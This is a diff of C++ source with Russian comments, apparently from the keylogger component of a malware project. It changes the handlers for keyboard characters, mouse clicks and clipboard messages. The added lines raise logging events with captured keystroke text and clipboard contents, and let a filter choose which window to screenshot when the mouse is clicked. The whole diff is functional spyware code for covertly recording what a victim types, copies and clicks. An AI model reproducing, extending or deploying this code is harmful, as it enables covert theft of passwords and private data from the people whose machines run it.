@@ -692,6 +692,11 @@ void ProcessCharMessage(PMSG Msg, bool IsUnicode)
 
 	if (Buf != NULL)
 	{
+		// Вызываем событие
+		PCHAR S = STR::New(Buf, BufLen);
+        KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, S);
+		STR::Free(S);
+
 		KeyLogger::AddStrToBuffer(NULL, Buf, BufLen);
 		if (FreeBuf)
 			STR::Free(Buf);
@@ -794,13 +799,18 @@ void ProcessMouseMessage(PMSG Msg)
 		KLGDBG("UnKLG", "Добавляем снимок нажатия кнопки мыши");
 		HWND LogWnd = NULL;
 
-		switch (KLG.Filter->MouseLogWnd) {
-        	case MOUSE_LOG_WND_ACTIVE: LogWnd = Msg->hwnd; break;
-			case MOUSE_LOG_WND_FOCUS:  LogWnd = (HWND)pGetFocus(); break;
-			case MOUSE_LOG_WND_FILTER: LogWnd = (HWND)KLG.Filter; break;  // Будем надеяться, что в логе небыло реального окна с таким wnd
-        default:
-            ;
-		}
+		// Запрашиваем окно для сохранения лога
+		if (KLG.Filter->OnGetLogWnd)
+			KLG.Filter->OnGetLogWnd(KLG.Filter, LogWnd);
+
+		if (LogWnd == NULL)
+		{
+			switch (KLG.Filter->MouseLogWnd) {
+				case MOUSE_LOG_WND_ACTIVE: LogWnd = Msg->hwnd; break;
+				case MOUSE_LOG_WND_FOCUS:  LogWnd = (HWND)pGetFocus(); break;
+				case MOUSE_LOG_WND_FILTER: LogWnd = (HWND)KLG.Filter; break;  // Будем надеяться, что в логе небыло реального окна с таким wnd
+			}
+        }
 
 		KeyLogger::AddScreenShot(LogWnd, !KLG.Filter->Data.DontShowSSInStr, Shot, Size);
 		MemFree(Shot);
@@ -1070,7 +1080,10 @@ void ProcessClipBoardMessage(PMSG Msg, PKeyLogger Logger)
 
 	// Добавляем их в хранилище
 	if (Data != NULL)
+	{
+    	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
 		KeyLogger::AddStrToBuffer(NULL, Data, 0);
+    }
 
 	// Закрываем буфер обмена
 	pGlobalUnlock(DataHandle);
